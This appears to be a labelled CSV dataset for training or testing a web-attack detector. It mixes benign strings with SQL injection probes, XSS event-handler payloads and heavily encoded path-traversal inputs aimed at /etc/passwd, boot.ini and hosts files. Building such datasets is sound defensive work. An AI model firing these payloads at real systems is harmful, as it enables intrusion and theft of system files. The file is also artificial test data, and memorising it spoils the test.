"payload","label"
".?%u2216.?%u2216.?%u2216.?%u2216.?%u2216.?%u2216etc%u2216passwd","Suspicious"
"%%c0%6e%c0%6e%bg%qf%%c0%6e%c0%6e%bg%qf%%c0%6e%c0%6e%bg%qf%%c0%6e%c0%6e%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts","Suspicious"
"/var/log/news.all","Suspicious"
"<figure draggable=""true"" ondragleave=""alert(1)"">test</figure>","XSS"
"<q id=x tabindex=1 onactivate=alert(1)></q>","XSS"
"1%""  )  )   union all select null,null,null#","SQLi"
"%c0%5e%c0%5e%f0%80%80%afetc%f0%80%80%afissue","Suspicious"
"1' where 6853  =  6853 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --","SQLi"
"%e0%80%ae%e0%80%ae%f8%80%80%80%af%e0%80%ae%e0%80%ae%f8%80%80%80%af%e0%80%ae%e0%80%ae%f8%80%80%80%af%e0%80%ae%e0%80%ae%f8%80%80%80%af%e0%80%ae%e0%80%ae%f8%80%80%80%af%e0%80%ae%e0%80%ae%f8%80%80%80%afetc%f8%80%80%80%afpasswd","Suspicious"
"1  )  )   )  or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (   ( 7589 = 7589","SQLi"
"%c0.%c0.%c0%qf%c0.%c0.%c0%qf%c0.%c0.%c0%qf%c0.%c0.%c0%qf%c0.%c0.%c0%qfetc%c0%qfissue","Suspicious"
"<img  src=""x:gif"" onerror=""window['al\u0065rt'](0)""></img>","XSS"
".%00.%c0%9v.%00.%c0%9v.%00.%c0%9v.%00.%c0%9vetc%c0%9vissue","Suspicious"
"1' union all select null,null,null--","SQLi"
"1   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  # ujdg","SQLi"
"-6890""   )    )     )   union all select 1115#","SQLi"
"\../\../boot.ini","Suspicious"
"<button onpaste=""alert(1)"" contenteditable>test</button>","XSS"
"%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vboot.ini","Suspicious"
"<dt onblur=alert(1) tabindex=1 id=x></dt><input autofocus>","XSS"
".?%c1%af.?%c1%af.?%c1%af.?%c1%af.?%c1%af.?%c1%afwindows%c1%afsystem32%c1%afdrivers%c1%afetc%c1%afhosts","Suspicious"
"..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd","Suspicious"
"INSERT INTO page  ( flew, reach, printed )  VALUES  ( 'baby', 'bush', 'unhappy' )","Normal"
"-6412  )  )   as cnfs where 6557 = 6557 union all select 6557,6557,6557,6557,6557,6557,6557,6557,6557#","SQLi"
"select sleep ( 5 )  and  ( ""tlbp"" = ""tlbp","SQLi"
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 181 )  ORDER BY meta_id ASC","Normal"
"0x2e0x2e%252f0x2e0x2e%252f0x2e0x2e%252f0x2e0x2e%252fboot.ini","Suspicious"
"1' )  or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and  ( 'efwq' like 'efwq","SQLi"
"SELECT Employees.was, COUNT ( Orders.streetID )  AS schoolFROM    ( OrdersINNER JOIN jar ON Orders.cookiesID  =  Employees.helloID )","Normal"
"rebull canudes","Normal"
"-6616 )  order by 1--","SQLi"
"end and 'blit' = 'blit","SQLi"
"<main onmousedown=""alert(1)"">test</main>","XSS"
"%f8%80%80%80%ae%f8%80%80%80%ae%2fboot.ini","Suspicious"
".%00.%25c1%259c.%00.%25c1%259c.%00.%25c1%259c.%00.%25c1%259c.%00.%25c1%259c.%00.%25c1%259cetc%25c1%259cpasswd","Suspicious"
"-4558' or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #","SQLi"
"<dir draggable=""true"" ondrag=""alert(1)"">test</dir>","XSS"
"select * from users where id  =  1 or ""  )  ["" or 1  =  1 -- 1","SQLi"
"1'|| ( select 'xtcb' where 5240 = 5240","SQLi"
"SELECT Employees.examine, COUNT ( Orders.tailID )  AS cellFROM    ( OrdersINNER JOIN teeth ON Orders.fenceID  =  Employees.cageID )","Normal"
"%f8%80%80%80%ae%f8%80%80%80%ae%c1%1c%f8%80%80%80%ae%f8%80%80%80%ae%c1%1c%f8%80%80%80%ae%f8%80%80%80%ae%c1%1cwindows%c1%1csystem32%c1%1cdrivers%c1%1cetc%c1%1chosts","Suspicious"
"..\\..\\..\\..\\..\\..\\boot.ini","Suspicious"
"%c0%ee%c0%ee%u2216%c0%ee%c0%ee%u2216%c0%ee%c0%ee%u2216%c0%ee%c0%ee%u2216etc%u2216passwd","Suspicious"
"1' and 9970 = 3409","SQLi"
"fetzko","Normal"
"con2e5u934e1215e","Normal"
"1""   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and ""cbck"" like ""cbck","SQLi"
"-9871""  )   union all select 9082#","SQLi"
"SELECT * FROM vowel","Normal"
"/var/cron/log","Suspicious"
"ladronzue_lo","Normal"
"1"" where 8016  =  8016","SQLi"
"1'  )   where 6056  =  6056 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --","SQLi"
"SELECT * FROM sugar WHERE send NOT BETWEEN 'everybody' AND 'not'","Normal"
"<i onpointerup=alert(1)>XSS</i>","XSS"
"1"" )  as eoer where 8667 = 8667 or 6793 =  ( select 6793 from pg_sleep ( 5  )  )  --","SQLi"
"Some commentators interpreted use force attempt ailing movement win concessions financial spoils government","Normal"
"1%' )  or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --","SQLi"
"<animatetransform onpointerdown=alert(1)>XSS</animatetransform>","XSS"
"1' union all select null,null,null,null,null,null,null#","SQLi"
"-8099%'   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   '%'  =  '","SQLi"
"%c0%ee%c0%ee%c0%5c%c0%ee%c0%ee%c0%5c%c0%ee%c0%ee%c0%5c%c0%ee%c0%ee%c0%5c%c0%ee%c0%ee%c0%5c%c0%ee%c0%ee%c0%5cetc%c0%5cpasswd","Suspicious"
".%2e%uF025.%2e%uF025.%2e%uF025.%2e%uF025boot.ini","Suspicious"
"%c0%fe%c0%fe%25c1%259cetc%25c1%259cissue","Suspicious"
"%25c0%25ae%25c0%25ae%%32%%66%25c0%25ae%25c0%25ae%%32%%66%25c0%25ae%25c0%25ae%%32%%66%25c0%25ae%25c0%25ae%%32%%66%25c0%25ae%25c0%25ae%%32%%66boot.ini","Suspicious"
"0x2e0x2e%5c0x2e0x2e%5cetc%5cpasswd","Suspicious"
"..0x2fetc0x2fpasswd","Suspicious"
"-8506'   )    )     )   union all select 1950,1950,1950,1950,1950,1950--","SQLi"
"<dt id=x tabindex=1 onbeforedeactivate=alert(1)></dt><input autofocus>","XSS"
"SELECT * FROM east  WHERE applied NOT LIKE '[policeman]%'","Normal"
"1' )  or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and  ( 'vxqs' = 'vxqs","SQLi"
"1 where 6494 = 6494 and 8463 = 2760","SQLi"
"C:/programfiles/apachegroup/apache/conf/httpd.conf","Suspicious"
"SELECT * FROM law ORDER BY line DESC","Normal"
"%c0%ae%c0%ae%c1%af%c0%ae%c0%ae%c1%af%c0%ae%c0%ae%c1%af%c0%ae%c0%ae%c1%af%c0%ae%c0%ae%c1%afwindows%c1%afsystem32%c1%afdrivers%c1%afetc%c1%afhosts","Suspicious"
"-1366' or make_set  (  9354  =  9354,7185  )   and 'abre'  =  'abre","SQLi"
"plaza luis pombo, s/n 9?g","Normal"
"03440","Normal"
"..%01\..%01\etc\passwd","Suspicious"
"%c0.%c0.\%c0.%c0.\%c0.%c0.\%c0.%c0.\%c0.%c0.\etc\passwd","Suspicious"
"1'  )  )   and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (  'yhku' like 'yhku","SQLi"
"%2e.%f0%80%80%af%2e.%f0%80%80%af%2e.%f0%80%80%afboot.ini","Suspicious"
"4790000000000000","Normal"
"<map onmousemove=""alert(1)"">test</map>","XSS"
"<div draggable=""true"" contenteditable>drag me</div><optgroup ondrop=alert(1) contenteditable>drop here</optgroup>","XSS"
"..../%f8%80%80%80%af..../%f8%80%80%80%afetc%f8%80%80%80%afpasswd","Suspicious"
"1"" )  where 6964 = 6964","SQLi"
"SELECT * FROM college WHERE thing = 'lake'  AND City = 'spider'","Normal"
"-8429'  )  )   )  or make_set ( 9354 = 9354,7185 )  and   (  (   ( 'bwih' like 'bwih","SQLi"
"1'   )    )    as mdtm where 1393  =  1393 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --","SQLi"
"But stats show I &apos;m black sheep comes Halloween","Normal"
"<thead onmousedown=""alert(1)"">test</thead>","XSS"
"â or 3 = 3 --","SQLi"
"..%010x5c..%010x5c..%010x5c..%010x5c..%010x5c..%010x5cetc0x5cpasswd","Suspicious"
"</span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""http://www.goratings.org/"">""World's Go Player Ratings"" </a>. May 2017. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20170401123616/https://www.goratings.org/"">Archived </a> from the original on 1 April 2017. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=unknown&amp;rft.btitle=World%27s+Go+Player+Ratings&amp;rft.date=2017-05&amp;rft_id=http%3A%2F%2Fwww.goratings.org%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988"">","Normal"
"1  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users ) # ujdg","SQLi"
"-2112 union all select 2995,2995,2995,2995,2995--","SQLi"
"</span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Science&amp;rft.atitle=Artificial+intelligence+faces+reproducibility+crisis&amp;rft.pages=725-726&amp;rft.date=2018-02-16&amp;rft_id=info%3Adoi%2F10.1126%2Fscience.359.6377.725&amp;rft_id=info%3Abibcode%2F2018Sci...359..725H&amp;rft.aulast=Hutson&amp;rft.aufirst=Matthew&amp;rft_id=http%3A%2F%2Fscience.sciencemag.org%2Fcontent%2F359%2F6377%2F725&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988"">","Normal"
"1' where 2123 = 2123 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --","SQLi"
"%2e%2e%c0%2fetc%c0%2fpasswd","Suspicious"
"almirante cruilles 19, 11?c","Normal"
"0x2e0x2e%u22160x2e0x2e%u22160x2e0x2e%u2216etc%u2216issue","Suspicious"
"<li><a href=""#CITEREFCrevier1993"">Crevier 1993 </a>, pp.&#160;269–271 </li> </ul>","Normal"
"%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pc%2e%2e%c1%pcboot.ini","Suspicious"
"%252e%252e%c0%qf%252e%252e%c0%qf%252e%252e%c0%qf%252e%252e%c0%qfboot.ini","Suspicious"
"../../../../../../../../../../../../../../etc/passwd","Suspicious"
"??%2f??%2f??%2f??%2f??%2f??%2fetc%2fpasswd","Suspicious"
"<tt onmouseleave=""alert(1)"">test</tt>","XSS"
"?.%c0%9v?.%c0%9v?.%c0%9v?.%c0%9v?.%c0%9vboot.ini","Suspicious"
"SELECT curve ( s ) FROM tobacco INNER JOIN","Normal"
"%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5c%%32%%65%%32%%65%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","Suspicious"
"..2f..2f..2f..2f..2f..2f..2fvar2fwww2flogs2faccess_log","Suspicious"
"Mr Alderson , Keighley , added: &quot; We scared might fall stayed","Normal"
"spurway","Normal"
"SELECT * FROM balloon  WHERE roll = supper","Normal"
".%2e/.%2e/.%2e/boot.ini","Suspicious"
"%e0%80%ae%e0%80%ae%bg%qf%e0%80%ae%e0%80%ae%bg%qfboot.ini","Suspicious"
"SELECT land","Normal"
"%uff0e%uff0e%c1%1c%uff0e%uff0e%c1%1c%uff0e%uff0e%c1%1c%uff0e%uff0e%c1%1cwindows%c1%1csystem32%c1%1cdrivers%c1%1cetc%c1%1chosts","Suspicious"
"SELECT option_value FROM wp_options WHERE option_name  =  '_options_footer_button_3_link' LIMIT 1","Normal"
"%fc%80%80%80%80%ae%fc%80%80%80%80%ae%c1%afboot.ini","Suspicious"
"SELECT rateID AS ID, avoid AS recall FROM rice","Normal"
"lacero","Normal"
"%c0%2e%c0%2e%c1%1c%c0%2e%c0%2e%c1%1c%c0%2e%c0%2e%c1%1c%c0%2e%c0%2e%c1%1c%c0%2e%c0%2e%c1%1cboot.ini","Suspicious"
"0x2e0x2e%bg%qf0x2e0x2e%bg%qf0x2e0x2e%bg%qfetc%bg%qfpasswd","Suspicious"
"..../%c1%afboot.ini","Suspicious"
"1"" where 2131  =  2131 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --","SQLi"
"<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>","XSS"
"?.%f0%80%80%af?.%f0%80%80%af?.%f0%80%80%af?.%f0%80%80%af?.%f0%80%80%af?.%f0%80%80%afboot.ini","Suspicious"
"SELECT straw FROM valley UNION SELECT world FROM snow ORDER BY represent","Normal"
"<li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, p.&#160;363−365 </li>","Normal"
"1%' and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and '%' = '","SQLi"
"1'  )   where 8086  =  8086 and 1430  =  7941--","SQLi"
"1'   )    )    as fusi where 2788  =  2788 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #","SQLi"
"matzenauer@evelin.com.ci","Normal"
"1"" )  where 9020 = 9020 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --","SQLi"
"<style>@keyframes x{}</style><optgroup style=""animation-name:x"" onanimationstart=""alert(1)""></optgroup>","XSS"
"SELECT jump","Normal"
"1'  )  )   or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and   (  (  'ytxg' = 'ytxg","SQLi"
"%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%af%fc%80%80%80%80%ae%fc%80%80%80%80%ae%f0%80%80%afetc%f0%80%80%afpasswd","Suspicious"
"1%'  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  '%'  =  '","SQLi"
"..\/..\/..\/..\/..\/..\/boot.ini","Suspicious"
"c/ pedro ortiz, 128","Normal"
".../.%u2215.../.%u2215.../.%u2215windows%u2215system32%u2215drivers%u2215etc%u2215hosts","Suspicious"
"-2959"" union all select 3414,3414,3414,3414,3414,3414,3414,3414#","SQLi"
"29056","Normal"
"Dieter Thomas Kuhn Stuttgart: The &quot; singing mountain wave &quot; open-air stage Stuttgart - &quot; When summer ? &quot; actually question people &apos;s lips Killesberg Open-Air Theatre Friday evening","Normal"
"<tbody id=x tabindex=1 onfocusin=alert(1)></tbody>","XSS"
"SELECT AVG ( split ) FROM try SELECT SUM ( knife )","Normal"
"1%' )  and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and  ( '%' = '","SQLi"
"%%32%%65%%32%%650x2f%%32%%65%%32%%650x2f%%32%%65%%32%%650x2fetc0x2fpasswd","Suspicious"
"<header onkeypress=""alert(1)"" contenteditable>test</header>","XSS"
"<isindex onmouseover=""alert(1)"">test</isindex>","XSS"
"%25c0%25ae%25c0%25ae%u2216%25c0%25ae%25c0%25ae%u2216%25c0%25ae%25c0%25ae%u2216etc%u2216passwd","Suspicious"
"SELECT * FROM do  WHERE limited = onto","Normal"
"%5C..%c1%1c%5C..%c1%1c%5C..%c1%1cetc%c1%1cissue","Suspicious"
"SELECT * FROM passage WHERE length IN  ( 'bare', 'final', 'off' )","Normal"
"1%'   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   '%'  =  '","SQLi"
"<style>@keyframes slidein {}</style><menu style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></menu>","XSS"
"%c0%ae%c0%ae%f0%80%80%af%c0%ae%c0%ae%f0%80%80%af%c0%ae%c0%ae%f0%80%80%afetc%f0%80%80%afissue","Suspicious"
"<main id=x tabindex=1 onbeforedeactivate=alert(1)></main><input autofocus>","XSS"
"8322438262219801","Normal"
"%2e.%e0%80%af%2e.%e0%80%afetc%e0%80%afissue","Suspicious"
"01e9$6d5l7","Normal"
"1'||  (  select 'feyg' from dual where 7734  =  7734 and 3843  =  6724#","SQLi"
"1"" or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )","SQLi"
"..%c0%qf..%c0%qf..%c0%qf..%c0%qf..%c0%qfetc%c0%qfissue","Suspicious"
"select * from users where id  =  1 +$ 1 or 1  =  1 -- 1","SQLi"
"1' )  as ywtu where 3009 = 3009 or 4915 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --","SQLi"
"%c0%2e%c0%2e%25c1%259c%c0%2e%c0%2e%25c1%259c%c0%2e%c0%2e%25c1%259cwindows%25c1%259csystem32%25c1%259cdrivers%25c1%259cetc%25c1%259chosts","Suspicious"
"..../%c0%2fboot.ini","Suspicious"
"mazursky@mundo-deportivo.mx","Normal"
"%c0%ee%c0%ee%uF025%c0%ee%c0%ee%uF025%c0%ee%c0%ee%uF025%c0%ee%c0%ee%uF025%c0%ee%c0%ee%uF025%c0%ee%c0%ee%uF025etc%uF025issue","Suspicious"
"<img id=x tabindex=1 onfocus=alert(1)></img>","XSS"
".?%5c.?%5c.?%5c.?%5c.?%5c.?%5cetc%5cpasswd","Suspicious"
"The travel company expects full year underlying profit tax $ 325 million $ 340 million , compared $ 305 million $ 315 million previously forecast","Normal"
"1""  )   where 3404  =  3404 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --","SQLi"
"<li><a href=""/wiki/Friedrich_Wilhelm_Joseph_Schelling"" title=""Friedrich Wilhelm Joseph Schelling"">Friedrich Schelling </a> </li>","Normal"
"1""  )   where 1666  =  1666 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","SQLi"
"<svg id=x onfocus=alert(1)>","XSS"
"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, p.&#160;28 </li>","Normal"
"<style>:target {transform: rotate(180deg);}</style><textarea id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></textarea>","XSS"
"-8069   )    )    as sxbn where 7689  =  7689 union all select 7689,7689,7689,7689,7689,7689,7689,7689,7689,7689--","SQLi"
"1' )  or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )","SQLi"
"1"" where 6281  =  6281 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --","SQLi"
"%fc%80%80%80%80%ae%fc%80%80%80%80%ae%u2215%fc%80%80%80%80%ae%fc%80%80%80%80%ae%u2215%fc%80%80%80%80%ae%fc%80%80%80%80%ae%u2215%fc%80%80%80%80%ae%fc%80%80%80%80%ae%u2215%fc%80%80%80%80%ae%fc%80%80%80%80%ae%u2215boot.ini","Suspicious"
"63947168s","Normal"
"1 union all select null--","SQLi"
"<ins oncut=""alert(1)"" contenteditable>test</ins>","XSS"
"%2e%2e%c0%2f%2e%2e%c0%2fwindows%c0%2fsystem32%c0%2fdrivers%c0%2fetc%c0%2fhosts","Suspicious"
"1%' procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #","SQLi"
"1"" where 9172 = 9172 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --","SQLi"
"37766","Normal"
"<div onmouseout=""alert(1)"">test</div>","XSS"
"SELECT showID AS ID, immediately AS brave FROM warn","Normal"
"select  ( case when  ( 8808 = 1367 )  then 1 else 8808* ( select 8808 from master..sysdatabases )  end ) --","SQLi"
"-6249'   )    )     )   union all select 5136,5136,5136,5136,5136,5136,5136,5136,5136--","SQLi"
"1'+ ( select 'myrb' where 3622 = 3622 and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  )  +'","SQLi"
"samuel","Normal"
"<style>@keyframes x{}</style><video style=""animation-name:x"" onanimationend=""alert(1)""></video>","XSS"
"03786","Normal"
"1'  )   as dpmh where 5281  =  5281 and 2006  =  2006","SQLi"
"0x2e0x2e%25c1%259c0x2e0x2e%25c1%259c0x2e0x2e%25c1%259c0x2e0x2e%25c1%259c0x2e0x2e%25c1%259c0x2e0x2e%25c1%259cetc%25c1%259cissue","Suspicious"
"<style>:target {color:red;}</style><element id=x style=""transition:color 1s"" ontransitionend=alert(1)></element>","XSS"
"<u onmouseup=""alert(1)"">test</u>","XSS"
"coch soto","Normal"
"0x2e0x2e%c0%5c0x2e0x2e%c0%5c0x2e0x2e%c0%5cetc%c0%5cissue","Suspicious"
".?%uEFC8.?%uEFC8.?%uEFC8.?%uEFC8etc%uEFC8issue","Suspicious"
"<li><a href=""/wiki/Very_Large_Scale_Integration"" title=""Very Large Scale Integration"">Very Large Scale Integration </a> </li>","Normal"
"%252e%252e%uF025%252e%252e%uF025%252e%252e%uF025%252e%252e%uF025%252e%252e%uF025etc%uF025passwd","Suspicious"
"<div class=""section"" id=""extending-scrapy"">","Normal"
"??%f8%80%80%80%af??%f8%80%80%80%afetc%f8%80%80%80%afpasswd","Suspicious"
"<svg><option onload=alert(1)></option>","XSS"
"%252e%252e/%252e%252e/%252e%252e/%252e%252e/boot.ini","Suspicious"
"..%c1%8s..%c1%8swindows%c1%8ssystem32%c1%8sdrivers%c1%8setc%c1%8shosts","Suspicious"
".%00.%c0%9v.%00.%c0%9v.%00.%c0%9v.%00.%c0%9v.%00.%c0%9v.%00.%c0%9vetc%c0%9vissue","Suspicious"
"%f0%80%80%ae%f0%80%80%ae%u2216%f0%80%80%ae%f0%80%80%ae%u2216%f0%80%80%ae%f0%80%80%ae%u2216%f0%80%80%ae%f0%80%80%ae%u2216%f0%80%80%ae%f0%80%80%ae%u2216%f0%80%80%ae%f0%80%80%ae%u2216boot.ini","Suspicious"
"%5C..%252fboot.ini","Suspicious"
".\\..\\.\\..\\windows\\system32\\drivers\\etc\\hosts","Suspicious"
"&quot; New voices love sing welcome time , &quot; said Schlotmann","Normal"
"-1844' )  union all select 9572,9572,9572,9572#","SQLi"
"<image2 onpointermove=alert(1)>XSS</image2>","XSS"
"select * from generate_series ( 7536,7536,case when  ( 7536 = 7523 )  then 1 else 0 end )  limit 1--","SQLi"
"%252e%252e%bg%qf%252e%252e%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts","Suspicious"
"-8686"" where 4532  =  4532 or elt  (  3301  =  9065,9065  )  --","SQLi"
"1'+ ( select 'epza' where 8994 = 8994 and make_set ( 3782 = 2428,2428  )  )  +'","SQLi"
"1"" and 4595  =  4595#","SQLi"
"%c0%5e%c0%5e0x5c%c0%5e%c0%5e0x5c%c0%5e%c0%5e0x5c%c0%5e%c0%5e0x5c%c0%5e%c0%5e0x5c%c0%5e%c0%5e0x5cetc0x5cissue","Suspicious"
".%00.%2f.%00.%2fetc%2fissue","Suspicious"
"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""uhiy""  =  ""uhiy","SQLi"
"1""  )  )   and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and   (  (  ""kpwc"" like ""kpwc","SQLi"
"paulus","Normal"
"1""   )    )    as xwrq where 4161  =  4161","SQLi"
"nazarena","Normal"
"%uff0e%uff0e%25c0%25afboot.ini","Suspicious"
"%2e%2e%255c%2e%2e%255c%2e%2e%255c%2e%2e%255cwindows%255csystem32%255cdrivers%255cetc%255chosts","Suspicious"
"<div draggable=""true"" contenteditable>drag me</div><q ondragover=alert(1) contenteditable>drop here</q>","XSS"
